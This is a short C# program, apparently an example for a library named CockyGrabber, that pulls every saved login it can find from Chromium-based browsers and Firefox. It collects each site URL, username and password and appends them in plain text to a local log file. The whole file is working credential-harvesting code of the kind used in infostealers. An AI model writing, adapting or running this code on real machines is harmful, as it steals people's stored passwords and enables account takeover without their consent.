using CockyGrabber;
using CockyGrabber.Grabbers;
using System;
using System.Collections.Generic;
using System.IO;

namespace CockyGrabberTest
{
    // This Program grabs all Logins that could be found and saves them in a log file
    class Program
    {
        private const string LogFilePath = "LOG FILE PATH HERE.txt";

        static void Main(string[] args)
        {
            UniversalGrabber g = new UniversalGrabber(); // Create Grabber

            List<string> logins = new List<string>()
            {
                $"==========================================================================================",
                $"NEW LOG STARTED AT {DateTimeOffset.Now}:",
                "",
            };

            // Grab logins and store the URLs, Usernames and Passwords in 'logins':
            foreach (Chromium.Login c in g.GetAllChromiumLogins())
            {
                logins.Add($"Website: {c.OriginUrl} | Username: {c.UsernameValue} | Password: {c.PasswordValue}");
            }
            foreach (Firefox.Login c in g.FG.GetLogins())
            {
                logins.Add($"Website: {c.Hostname} | Username: {c.EncryptedUsername} | Password: {c.EncryptedPassword}");
            }

            File.AppendAllLines(LogFilePath, logins); // Append the grabbed Logins to the log file
        }
    }
}